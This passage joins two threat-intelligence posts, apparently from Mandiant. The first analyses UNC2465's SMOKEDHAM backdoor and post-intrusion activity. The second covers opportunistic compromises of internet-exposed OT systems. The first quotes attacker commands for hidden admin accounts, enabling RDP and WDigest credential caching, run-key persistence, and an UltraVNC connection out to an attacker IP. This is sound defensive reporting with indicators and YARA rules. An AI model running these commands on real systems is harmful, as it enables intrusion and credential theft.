  <i>UwOdHsFXjdCOIrjTCfnblwEZ</i> used for RC4 encryption and
  decryption.<br /> </p>
 <h5>SMOKEDHAM Commands</h5>
 <p>SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in
  the Data field. The backdoor checks if the plaintext command data
  begins with one of the following keywords, shown in Table 1.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="121" valign="top"><p>
          <b>Keyword</b></p> </td> <td width="528" valign="top"><p>
          <b>Action</b></p> </td> </tr>
    <tr>
      <td width="121" valign="top"><p>delay</p> </td> <td width="528"
          valign="top"><p>Update its sleep interval</p> </td> </tr>
    <tr>
      <td width="121" valign="top"><p>screenshot</p> </td> <td
        width="528" valign="top"><p>Upload a screen capture to its C2
          server via a subsequent HTTP POST request</p> </td> </tr>
    <tr>
      <td width="121" valign="top"><p>exit</p> </td> <td width="528"
        valign="top"><p>Terminate</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 1: Plaintext command data keywords<br />  </span>
  <br /> If the plaintext command data does not begin with any of the
  keywords listed in Table 1, then SMOKEDHAM assumes the data contains a
  PowerShell command and attempts to execute it. The backdoor uploads
  output generated by the PowerShell command to its C2 server via a
  subsequent HTTP POST request.</p>
 <p>In addition to supporting the commands in Table 1, SMOKEDHAM
  continuously captures keystrokes. The backdoor writes captured
  keystrokes to memory and uploads them to its C2 server every five
  seconds via HTTP POST requests.</p>
 <h5>SMOKEDHAM In Action</h5>
 <p>SMOKEDHAM was observed executing commands on the target system using PowerShell. </p>
 <p>The following commands were used to collect information about the
  system and logged in users.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">net.exe user</span></p> <p>
          <span class="code">net.exe users<br />  <br />
        whoami.exe</span></p> <p>
          <span class="code">whoami.exe /priv </span></p> <p>
          <span class="code">systeminfo.exe</span></p> </td> </tr></tbody></table>
 <p>The following commands were used to create and add the DefaultUser
  account to the local Administrators group, and subsequently hide the
  account from the Windows logon screen.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">net.exe user DefaultUser REDACTED
        /ADD </span></p> <p>
          <span class="code">net.exe localgroup Administrators
            DefaultUser /ADD </span></p> <p>
          <span class="code">reg.exe ADD
            'HKLM\SOFTWARE\Microsoft\Windows
            NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' /v
            DefaultUser /t REG_DWORD /d 0 /f</span></p> </td> </tr></tbody></table>
 <p>The following commands facilitated lateral movement by modifying
  Terminal Server registry key values to enable multiple Remote Desktop
  connection sessions, and modifying the Local Security Authority (LSA)
  registry key value to require a password for authentication.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">reg.exe ADD
            'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v
            fDenyTSConnections /t REG_DWORD /d 0 /f</span></p> <p>
          <span class="code">reg.exe ADD
            'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v
            fSingleSessionPerUser /t REG_DWORD /d 0 /f</span></p> <p>
          <span class="code">reg.exe ADD
            HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v
            LimitBlankPasswordUse /t REG_DWORD /d 1 /f</span></p> </td> </tr></tbody></table>
 <p>Additionally, SMOKEDHAM modified the WDigest registry key value
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
  to enable credential caching.</p>
 <h4>Phase 6: Follow-on Activity</h4>
 <p>SMOKEDHAM used PowerShell to connect to third-party file sharing
  sites to download the UltraVNC application renamed as winvnc.exe, and
  a configuration file named UltraVNC.ini, shown in Figure 8. These
  files were saved to the %APPDATA%\Chrome\ directory. The UltraVNC.ini
  file allowed UltraVNC to connect to port 6300 on the loopback address
  specified by the parameter AllowLoopback=1.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside-supply-chain/fig8.png" alt="" />
  <br /> <span class="type-XS">Figure 8: Contents of UltraVNC.ini</span></p>
 <p>SMOKEDHAM was observed using UltraVNC to establish a connection to
  the IP address and port pair 81.91.177[.]54[:]7234 that has been
  observed in past UNC2465 intrusions.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">%APPDATA%\Chrome\winvnc.exe' -autoreconnect
            ID:15000151 -connect 81.91.177[.]54[:]7234 –run</span></p>
      </td> </tr></tbody></table>
 <p>SMOKEDHAM created a persistence mechanism for UltraVNC by adding the
  application to the ConhostNT value under the current users Run
  registry key.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">reg.exe add
            HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v
            ConhostNT /d %appdata%\Chrome\winvnc.exe<br /> </span></p>
      </td> </tr></tbody></table>
 <h4>NGROK Configuration</h4>
 <p>SMOKEDHAM used PowerShell to connect to third-party file sharing
  sites to download an NGROK utility that was renamed conhost.exe, and a
  script named VirtualHost.vbs that was used to execute NGROK with a
  configuration file named ngrok.yml. These files were stored in the
  C:\ProgramData\WindNT\ directory. NGROK is a publicly available
  utility that can expose local servers behind NATs and firewalls to the
  public internet over secure tunnels.</p>
 <p>Figure 9 and Figure 10 show the contents of VirtualHost.vbs and
  ngrok.yml files, respectively.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside-supply-chain/fig9.png" alt="" />
  <br /> <span class="type-XS">Figure 9: Contents of VirtualHost.vbs</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/darkside-supply-chain/fig10.png" alt="" />
  <br /> <span class="type-XS">Figure 10: Contents of ngrok.yml</span></p>
 <p>The execution of VirtualHost.vbs allowed NGROK to listen and forward
  traffic on TCP port 6300 through an NGROK tunnel, subsequently
  allowing NGROK to tunnel UltraVNC traffic out of the environment.</p>
 <p>SMOKEDHAM created a persistence mechanism for NGROK by adding
  VirtualHost.vbs to the WindNT value under the current users Run
  registry key.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">reg.exe add
            HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindNT
            /d C:\ProgramData\WindNT\VirtualHost.vbs</span></p> </td> </tr></tbody></table>
 <h4>Keylogger Deployment</h4>
 <p>This attacker utilized an additional keylogging utility named
  C:\ProgramData\psh\console.exe. The keylogging utility was configured
  to capture and record keystrokes to C:\ProgramData\psh\System32Log.txt.</p>
 <p>Mandiant then observed the attacker use UltraVNC to download two LNK
  files that reference the keylogging utility. The downloaded files were
  named desktop.lnk and console.lnk, respectively, and were placed in
  the following persistence locations:</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">C:\Users\[username]\Start
        Menu\Programs\Startup\desktop.lnk</span></p> <p>
          <span class="code">%APPDATA%\Microsoft\Windows\Start
        Menu\Programs\Startup\desktop.lnk</span></p> <p>
          <span class="code">%APPDATA%\Microsoft\Windows\Start
        Menu\Programs\Startup\console.lnk</span></p> </td> </tr></tbody></table>
 <h4>Cobalt Strike Beacon</h4>
 <p>The attacker used UltraVNC to download an in-memory dropper for
  Cobalt Strike to C:\ProgramData\Cisco Systems\Cisco Jabber\update.exe.
  Update.exe was a Go based dropper created using the <a
  href="https://github.com/optiv/ScareCrow">ScareCrow</a> framework. The
  attacker executed C:\ProgramData\Cisco Systems\Cisco Jabber\update.exe
  using Command Prompt.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">cmd.exe /c 'C:\ProgramData\Cisco
            Systems\Cisco Jabber\update.exe'&amp;&amp;exit</span></p>
      </td> </tr></tbody></table>
 <p>The execution of ScareCrow framework dropper C:\ProgramData\Cisco
  Systems\Cisco Jabber\update.exe resulted in the creation of a Cobalt
  Strike stageless payload to C:\ProgramData\Cisco\update.exe, which
  then established a connection to a Cobalt Strike Beacon server located
  at w2doger[.]xyz when executed.</p>
 <p>Mandiant observed the attacker using UltraVNC to download and store
  a file named update.lnk in the %APPDATA%\Microsoft\Windows\Start
  Menu\Programs\Startup\ directory. Mandiant was not able to recover
  update.lnk at the time of writing, but suspects that this file was
  created to add persistence to the Cobalt Strike stageless payload.</p>
 <h4>LSASS Dumping and Lateral Movement<i></i></h4>
 <p>Mandiant observed this attacker dump the LSASS process using Task
  Manager to a file named lsass.DMP, and later, zip the dump into two
  files named lsass.zip and lsass2.zip located in the
  C:\ProgramData\psh\ directory.</p>
 <p>From this point, the attacker was observed moving laterally to
  different systems in the environment using Remote Desktop Protocol
  (RDP) connections.</p>
 <h4>Conclusion</h4>
 <p>UNC2465 established initial access via a Trojanized installer
  executed by an unsuspecting user. UNC2465 interactively established an
  NGROK tunnel and began moving laterally in less than 24 hours. Five
  days later, UNC2465 returned and deployed additional tools such as a
  keylogger, Cobalt Strike BEACON, and conducted credential harvesting
  via dumping LSASS memory.</p>
 <p>Ransomware groups continue to adapt and pursue opportunistic access
  to victims. UNC2465’s move from drive-by attacks on website visitors
  or phishing emails to this software supply chain attack shows a
  concerning shift that presents new challenges for detection. While
  many organizations are now focusing more on perimeter defenses and
  two-factor authentication after recent public examples of password
  reuse or VPN appliance exploitation, monitoring on endpoints is often
  overlooked or left to traditional antivirus. A well-rounded security
  program is essential to mitigate risk from sophisticated groups such
  as UNC2465 as they continue to adapt to a changing security landscape.</p>
 <h4>Indicators</h4>
 <p>
  <i>Supply Chain/Trojanized Nullsoft Installer/SmartPSS</i></p>
 <p>MD5: 1430291f2db13c3d94181ada91681408<br /> Filename:
  SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe<br />
  Zip MD5: 54e0a0d398314f330dfab6cd55d95f38</p>
 <p>
  <i>Supply Chain/Trojanized Nullsoft Installer/SVStation</i></p>
 <p>MD5: e9ed774517e129a170cdb856bd13e7e8<br /> Filename: SVStation_Win64-B1130.1.0.0.exe</p>
 <p>
  <i>Intermediate Stage</i></p>
 <p>URL: hxxp://sdoc[.]xyz/ID-508260156241<br /> IP: 185.92.151[.]150</p>
 <p>
  <i>SMOKEDHAM LOADER</i></p>
 <p>MD5: f075c2894ac84df4805e8ccf6491a4f4 (Gbdh7yghJgbj3bb.html)</p>
 <p>MD5: 05d38c7e957092f7d0ebfc7bf1eb5365</p>
 <p>
  <i>SMOKEDHAM</i></p>
 <p>MD5: 127bf1d43313736c52172f8dc6513f56 (in-memory from
  f075c2894ac84df4805e8ccf6491a4f4)<br /> Host:
  max-ghoster1.azureedge[.]net (actual C2)</p>
 <p>MD5: 9de326bf37270776b78e30d442bda48b (MEtNOcyfkXWe.html)<br />
  Host: atlant20.azureedge[.]net (actual C2) </p>
 <p>MD5: b06319542cab55346776f0358a61b3b3 (in-memory from
  05d38c7e957092f7d0ebfc7bf1eb5365)<br /> Host:
  skolibri13.azureedge[.]net (actual C2)</p>
 <p>
  <i>NGROK</i></p>
 <p>MD5: e3bc4dd84f7a24f24d790cc289e0a10f (legitimate NGROK renamed to conhost.exe)</p>
 <p>MD5: 84ed6012ec62b0bddcd18058a8ff7ddd (VirtualHost.vbs)</p>
 <p>
  <i>UltraVNC</i></p>
 <p>IP/Port: 81.91.177[.]54:7234 (using legitimate ULTRAVNC 23b89bf2c2b99fbc1e232b4f86af65f4)</p>
 <p>
  <i>BEACON</i></p>
 <p>Host: w2doger[.]xyz<br /> IP: 185.231.68.102<br /> MD5:
  a9fa3eba3f644ba352462b904dfbcc1a (shellcode)</p>
 <h4>Detecting the Techniques</h4>
 <p>FireEye detects this activity across our platforms. The following
  contains specific detection names that provide indicators associated
  with this activity.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="631"> <tbody>
    <tr>
      <td width="259" valign="top"><p>
          <b>Platform</b></p> </td> <td width="372" valign="top"><p>
          <b>Detection Name</b></p> </td> </tr>
    <tr>
      <td width="259" valign="top"><p>FireEye Network Security</p>
          <p>FireEye Email Security</p> <p>FireEye Detection On
        Demand</p> <p>FireEye Malware Analysis</p> <p>FireEye Malware
          File Protect</p> <p> </p> </td> <td width="372"
          valign="top"><ul> <li>Backdoor.BEACON</li>
          <li>FE_Loader_Win32_BLUESPINE_1</li>
          <li>Trojan.Win32.CobaltStrike</li>
          <li>Backdoor.MSIL.SMOKEDHAM</li> <li>Malware.Binary.ps1</li>
          <li>FEC_Backdoor_CS_SMOKEDHAM_1</li> <li>Suspicious Process
            PowerShell Activity</li> </ul> </td> </tr>
    <tr>
      <td width="259" valign="top"><p>FireEye Endpoint Security</p>
      </td> <td width="372" valign="top"><p>
          <b>Real-Time Detection (IOC)</b></p> <ul> <li>WDIGEST
            CREDENTIAL EXPOSURE (METHODOLOGY)</li> <li>WDIGEST
            CREDENTIAL EXPOSURE VIA REGISTRY (METHODOLOGY)</li>
            <li>SUSPICIOUS CONHOST.EXE A (METHODOLOGY) </li> <li>TASKMGR
            PROCESS DUMP OF LSASS.EXE A (METHODOLOGY)</li> </ul> <p>
          <b>Malware Protection (AV/MG)</b></p> <ul>
          <li>Trojan.GenericFCA.Script.533 </li>
          <li>Trojan.GenericFCA.Agent.7732</li>
          <li>Dropped:Trojan.VBS.VGU</li>
          <li>Trojan.CobaltStrike.FM</li> <li>NGRok</li> <li>Ultra
          VNC</li> <li>SVN Station</li>
          <li>Generic.mg.a9fa3eba3f644ba3</li>
          <li>Generic.mg.1626373508569884</li> </ul> <p>
          <b>Modules</b></p> <ul> <li>Process Guard (LSASS memory
          protection)</li> </ul> </td> </tr>
    <tr>
      <td width="259" valign="top"><p>FireEye Helix</p> </td> <td
        width="372" valign="top"><ul> <li>VNC METHODOLOGY [Procs]
          (T1021.005)</li> <li>WINDOWS ANALYTICS [Abnormal RDP Logon]
          (T1078)</li> <li>WINDOWS ANALYTICS [Recon Commands]
          (T1204)</li> <li>WINDOWS METHODOLOGY [Cleartext Credentials
            Enabled - UseLogonCredential] (T1003.001)</li> <li>WINDOWS
            METHODOLOGY [LSASS Generic Dump Activity] (T1003.001)</li>
            <li>WINDOWS METHODOLOGY [LSASS Memory Access]
          (T1003.001)</li> <li>WINDOWS METHODOLOGY [Registry Run Key -
            reg.exe] (T1547.001)</li> <li>WINDOWS METHODOLOGY [User
            Created - Net Command] (T1136.001)</li> </ul> </td> </tr></tbody></table>
 <h4>Yara Detections</h4>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="649" valign="top"><p>
          <span class="code">rule Backdoor_Win_SMOKEDHAM<b>
              <br />  </b>{<b>
              <br />  </b>    meta:<b>
              <br />  </b>        author = &quot;Mandiant&quot;<b>
              <br />  </b>        date_created = &quot;2021-06-10&quot;<b>
              <br />  </b>        md5 = &quot;9de326bf37270776b78e30d442bda48b&quot;<b>
              <br />  </b>    strings:<b>
              <br />  </b>        $C2Method = { 2E 4D 65 74 68 6F 64 20
            3D 20 22 50 4F 53 54 22 } //.Method = &quot;POST&quot;<b>
              <br />  </b>        $domainFrontingDomain = /\.[hH]ost\s*=\s*\&quot;[^\&quot;]*&quot;;/<b>
              <br />  </b>        $envCollection1 = { 45 6E 76 69 72 6F
            6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74
            56 61 72 69 61 62 6C 65 28 22 43 4F 4D 50 55 54 45 52 4E 41
            4D 45 22 29 } //Environment.GetEnvironmentVariable(&quot;COMPUTERNAME&quot;)<b>
              <br />  </b>        $envCollection2 = { 45 6E 76 69 72 6F
            6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74
            56 61 72 69 61 62 6C 65 28 22 55 53 45 52 44 4F 4D 41 49 4E
            22 29 } //Environment.GetEnvironmentVariable(&quot;USERDOMAIN&quot;)<b>
              <br />  </b>        $envCollection3 = { 45 6E 76 69 72 6F
            6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74
            56 61 72 69 61 62 6C 65 28 22 55 53 45 52 4E 41 4D 45 22 29
            } //Environment.GetEnvironmentVariable(&quot;USERNAME&quot;)<b>
              <br />  </b>        $functionalityString1 = { 28 22 64 65
            6C 61 79 22 29 } //(&quot;delay&quot;)<b>
              <br />  </b>        $functionalityString2 = { 28 22 73 63
            72 65 65 6E 73 68 6F 74 22 29 } //(&quot;screenshot&quot;)<b>
              <br />  </b>        $functionalityString3 = { 28 22 65 78
            69 74 22 29 } //(&quot;exit&quot;)<b>
              <br />  </b>        $publicStrings1 = &quot;public string UUID&quot;<b>
              <br />  </b>        $publicStrings2 = &quot;public string ID&quot;<b>
              <br />  </b>        $publicStrings3 = &quot;public string Data&quot;<b>
              <br />  </b>        $UserAgentRequest = { 20 3D 20 45 6E
            76 69 72 6F 6E 6D 65 6E 74 2E 4F 53 56 65 72 73 69 6F 6E 2E
            54 6F 53 74 72 69 6E 67 28 29 3B } // = Environment.OSVersion.ToString();<b>
              <br />  </b>   condition:<b>
              <br />  </b>        filesize &lt; 1MB and all of
        them</span></p> <p>
          <span class="code">}</span></p> </td> </tr></tbody></table>
 <p> </p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="649" valign="top"><p>
          <span class="code">rule Loader_Win_SMOKEDHAM<br />  {<br />
                meta:<br />          author = &quot;Mandiant&quot;<br />
                    date_created = &quot;2021-06-10&quot;<br />         
            md5 = &quot;05d38c7e957092f7d0ebfc7bf1eb5365&quot;<br />
                strings:<br />          $listedDLLs1 =
            &quot;System.Drawing.dll&quot; fullword<br />         
            $listedDLLs2 = &quot;System.Web.Extensions.dll&quot;
            fullword<br />          $listedDLLs3 =
            &quot;System.Windows.Forms.dll&quot; fullword<br />         
            $CSharpLang = {2d 4c 61 6e 67 75 61 67 65 20 43 53 68 61 72
            70} // -Language CSharp<br />          $StringConversion =
            &quot;convertto-securestring&quot; nocase<br />         
            $SecureString1 = {5b 53 79 73 74 65 6d 2e 52 75 6e 74 69 6d
            65 2e 49 6e 74 65 72 6f 70 53 65 72 76 69 63 65 73 2e 4d 61
            72 73 68 61 6c 5d 3a 3a 53 65 63 75 72 65 53 74 72 69 6e 67
            54 6f 42 53 54 52}
            //[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR<br />
                    $SecureString2 = {5b 53 79 73 74 65 6d 2e 52 75 6e
            74 69 6d 65 2e 49 6e 74 65 72 6f 70 53 65 72 76 69 63 65 73
            2e 4d 61 72 73 68 61 6c 5d 3a 3a 50 74 72 54 6f 53 74 72 69
            6e 67 41 75 74 6f}
            //[System.Runtime.InteropServices.Marshal]::PtrToStringAuto<br />
                condition:<br />          filesize &lt; 1MB and (1 of
            ($listedDLLs*)) and $CSharpLang and $StringConversion and
            $SecureString1 and $SecureString2<br />  }</span></p> </td> </tr></tbody></table>
 <h4>MITRE ATT&amp;CK UNC2465</h4>
 <table border="0" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="150" valign="top"><p>
          <b>Tactic</b></p> </td> <td width="474" valign="top"><p>
          <b>Description</b></p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Initial Access</p> </td> <td
        width="474" valign="top"><p>   T1189: Drive-by Compromise<br />
             T1195.002: Compromise Software Supply Chain<br />    T1566:
        Phishing</p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Execution</p> </td> <td
        width="474" valign="top"><p>   T1053.005: Scheduled Task<br />
             T1059.001: PowerShell<br />    T1059.005: Visual Basic</p>
      </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Persistence</p> </td> <td
        width="474" valign="top"><p>   T1098: Account Manipulation<br />
             T1136: Create Account<br />    T1547.001: Registry Run Keys
          / Startup Folder<br />    T1547.004: Winlogon Helper DLL<br />
             T1547.009: Shortcut Modification</p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Defense Evasion</p> </td> <td
        width="474" valign="top"><p>   T1027: Obfuscated Files or
          Information<br />    T1070.006: Timestomp<br />    T1112:
          Modify Registry<br />    T1140: Deobfuscate/Decode Files or
          Information<br />    T1218.005: Mshta<br />    T1553.002: Code
          Signing<br />    T1562.004: Disable or Modify System
        Firewall</p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Discovery</p> </td> <td
        width="474" valign="top"><p>   T1012: Query Registry<br />   
          T1033: System Owner/User Discovery<br />    T1082: System
          Information Discovery</p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Collection</p> </td> <td
        width="474" valign="top"><p>   T1056.001: Keylogging<br />   
          T1113: Screen Capture<br />    T1560: Archive Collected
        Data</p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Impact</p> </td> <td width="474"
          valign="top"><p>   T1486: Data Encrypted for Impact<br />   
          T1531: Account Access Removal</p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Command and Control</p> </td> <td
        width="474" valign="top"><p>   T1071.001: Web Protocols<br />   
          T1090.004: Domain Fronting<br />    T1102: Web Service<br />
             T1105: Ingress Tool Transfer<br />    T1219: Remote Access
          Software<br />    T1572: Protocol Tunneling<br />   
          T1573.002: Asymmetric Cryptography</p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Lateral Movement</p> </td> <td
        width="474" valign="top"><p>   T1021.004: SSH<br />   
          T1021.005: VNC</p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Credential Access</p> </td> <td
        width="474" valign="top"><p>   T1003.001: LSASS Memory</p> </td> </tr>
    <tr>
      <td width="150" valign="top"><p>Resource Development</p> </td> <td
        width="474" valign="top"><p>   T1588.003: Code Signing
          Certificates<br />    T1588.004: Digital Certificates<br />   
          T1608.003: Install Digital Certificate</p> </td> </tr></tbody></table>
 <h4>Acknowledgements</h4>
 <p>Thanks to everyone that contributed analysis and review. Special
  thanks to Alison Stailey, Joseph Reyes, Nick Richard, Andrew Thompson,
  Jeremy Kennelly, Joshua Sablatura, Evan Reese, Van Ta, Stephen Eckels,
  and Tufail Ahmed.</p>
http://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html2021-06-16T16:00:00.000Z2021-06-17T15:36:14.616ZCrimes of Opportunity: Increasing Frequency of Low Sophistication
Operational Technology Compromisesnoemail@noemail.orgKeith Lunden<p>Attacks on control processes supported by operational technology (OT)
  are often perceived as necessarily complex. This is because disrupting
  or modifying a control process to cause a predictable effect is often
  quite difficult and can require a lot of time and resources. However,
  Mandiant Threat Intelligence has observed simpler attacks, where
  actors with varying levels of skill and resources use common IT tools
  and techniques to gain access to and interact with exposed OT systems.</p>
 <p>The activity is typically not sophisticated and is normally not
  targeted against specific organizations. Rather, the compromises
  appear to be driven by threat actors who are motivated to achieve
  ideological, egotistical, or financial objectives by taking advantage
  of an ample supply of internet-connected OT systems. As the actors are
  not interested in causing specific physical outcomes, they target
  whatever is available on the internet.</p>
 <p>Mandiant has observed an increase in compromises of
  internet-accessible OT assets over the past several years. In this
  blog post we discuss previously undisclosed compromises and place them
  in context alongside publicly known incidents. Although none of these
  incidents have appeared to significantly impact the physical world,
  their increasing frequency and relative severity calls for analysis on
  their possible risks and implications.</p>
 <p>Visit our website to learn more about <a
    href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">Mandiant’s
    OT security practice</a> or contact us directly to request <a
    href="/content/fireeye-www/en_US/mandiant.html">Mandiant
    services</a> or <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">threat intelligence</a>.</p>
 <h4>Compromises of Internet-Exposed OT Are Increasing in Frequency</h4>
 <p>While Mandiant has monitored threat actors claiming to share or sell
  access to internet-exposed OT systems since at least 2012, we have
  seen a significant increase in the frequency and relative severity of
  incidents in the past few years. The most common activity we observe
  involves actors trying to make money off exposed OT systems, but we
  also see actors simply sharing knowledge and expertise. More recently,
  we have observed more low sophistication threat activity leveraging
  broadly known tactics, techniques, and procedures (TTPs), and
  commodity tools to access, interact with, or gather information from
  internet exposed assets—something we had seen very little of in the past.</p>
 <p>This low sophistication threat activity has impacted a variety of
  targets across different industries, ranging from solar energy panels
  and water control systems, to building automation systems (BAS) and
  home security systems in academic and private residences. While some
  critical infrastructure targets are very sensitive in nature, other
  targets present very little risk.</p>
 <p>The following timeline presents a selection of some public and
  previously undisclosed OT compromises Mandiant observed between 2020
  and early 2021. We note that, although it is possible many of these
  incidents involved process interaction, high confidence validation is
  not feasible as most often the evidence is provided by the actor itself.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/crimes-of-opportunity/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Selection of notable low
    sophistication OT compromises: January 2020 to April 2021</span></p>
 <h4>Low Sophistication OT Threat Activity Can Take Many Forms</h4>
 <p>A consistent characteristic we observe among low sophisticated
  compromises is that actors most often exploit unsecure remote access
  services, such as virtual network computing (VNC) connections, to
  remotely access the compromised control systems. Graphical user
  interfaces (GUI), such as human machine interfaces (HMI), become the
  low-hanging fruit of process-oriented OT attacks as they provide a
  user-friendly representation of complex industrial processes, which
  enables actors to modify control variables without prior knowledge of
  a process. In many cases, the actors showed evidence of compromised
  control processes via images of GUIs, IP addresses, system timestamps,
  and videos.</p>
 <p>
  <i>Low Sophistication Threat Actors Access HMIs and Manipulate Control Processes</i></p>
 <p>In March 2020, we analyzed a series of screenshots shared by a
  threat actor who claimed to compromise dozens of control systems
  across North America, Western and Central Europe, and East Asia. Based
  on the timestamps from the images, the actor appeared to gain
  unauthorized access to these assets over a five-day period. The actor
  also shared a low-quality cell phone video showing their explicit
  interaction with a Dutch-language temperature control system.</p>
 <p>While much of this type of activity appears opportunistic in nature,
  some may also be driven by political motivations. For example, we have
  seen hacktivist groups that frequently use anti-Israel/pro-Palestine
  rhetoric in social media posts share images indicating that they had
  compromised OT assets in Israel, including a solar energy asset and
  the webserver of a datalogger used for different applications such as
  mining exploration and dam surveillance (Figure 2).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/crimes-of-opportunity/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Screenshots of compromised
    web-interfaces supporting OT</span></p>
 <p>Some threat actors appear particularly eager to demonstrate their
  interaction with compromised control systems. One threat actor shared
  multiple screen recordings making arbitrary set point changes to
  compromised HMIs via remote connections from their own desktop. While
  we suspect many of the victims compromised by this threat actor were
  small- and medium-sized businesses, on one occasion the group appeared
  to have successfully accessed the BAS of a hotel in Australia
  belonging to a major international hotel chain (Figure 3).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/crimes-of-opportunity/fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Screenshots showing a possible
    compromise of a hotel BAS</span></p>
 <p>
  <i>Some Amateur Actors Show Limited OT Expertise</i></p>
 <p>Some of the actors we track made comments that indicated they had
  either a limited understanding of the OT assets they compromised or
  that they were simply attempting to gain notoriety. For example, one
  threat actor shared a screenshot of a purportedly compromised
  German-language rail control system. We conducted a reverse image
  search of the screenshot and identified the asset as the web interface
  for an ECoS 50210 command station designed for model train sets
  (Figure 4).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/crimes-of-opportunity/fig4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: “Rail control system” that was
    really a web-interface for a model train set</span></p>
 <p>Another group made a similar gaffe when they claimed to retaliate
  for <a
    href="https://www.nytimes.com/2020/06/29/world/middleeast/iran-missile-explosion.html">an
    explosion at a missile facility in Iran</a> by compromising an
  Israeli “gas system.” A video of their operation showed that they had
  actually compromised a kitchen ventilation system installed at a
  restaurant in Ramat Hasharon, Israel (Figure 5).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/crimes-of-opportunity/fig5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: “Gas system” that was really a
    kitchen ventilation system</span></p>
 <p>
  <i>Low Sophistication OT Threat Activity is Supported by Hacktivist Tutorials</i></p>
 <p>In a few instances, actors operating as part of hacktivist
  collectives created and shared tutorials that instructed their
  affiliates and sympathetic parties on how to identify and compromise
  internet-accessible OT assets. The tutorials typically described
  simple methodologies, such as using VNC utilities to connect to IP
  addresses identified in Shodan or Censys searches for port 5900. These
  methods appear to have been used in some of the incidents we
  described, as some of the shared screenshots of compromised OT systems
  also showed the actor’s web browser tabs displaying similar Shodan
  queries and remote access tools.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/crimes-of-opportunity/fig6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: Hacktivist tutorial describing
    how to access the HMI of an industrial gas and liquid burner</span></p>
 <h4>Low Sophistication OT Compromises Pose A Growing Risk</h4>
 <p>Each of the low sophistication incidents we observe is unique and
  poses a different level of risk, which we normally determine by
  examining the actor’s previous work and reputation, the target’s
  industry, and the nature of the compromised process, among other
  things. While low sophistication incidents do not appear to commonly
  impact physical environments, they remain concerning for the following reasons.</p>
 <ul> <li>Each incident provides threat actors with opportunities to
    learn more about OT, such as the underlying technology, physical
    processes, and operations. These opportunities can increase an
    adversary's ability and enhance their tradecraft.</li> <li>Even
    low-sophistication intrusions into OT environments carry the risk of
    disruption to physical processes, mainly in the case of industries
    or organizations with less mature security practices. As the number
    of intrusions increase, so does the risk of process disruption.</li>
    <li>The publicity of these incidents normalizes cyber operations
    against OT and may encourage other threat actors to increasingly
    target or impact these systems. This is consistent with <a
      href="/content/fireeye-www/en_US/blog/threat-research/2020/07/financially-motivated-actors-are-expanding-access-into-ot.html">the
      increase in OT activity by more resourced financially-motivated
      groups and ransomware operators.</a></li> </ul>
 <h4>Security Best Practices and Situational Awareness Help Prevent Low
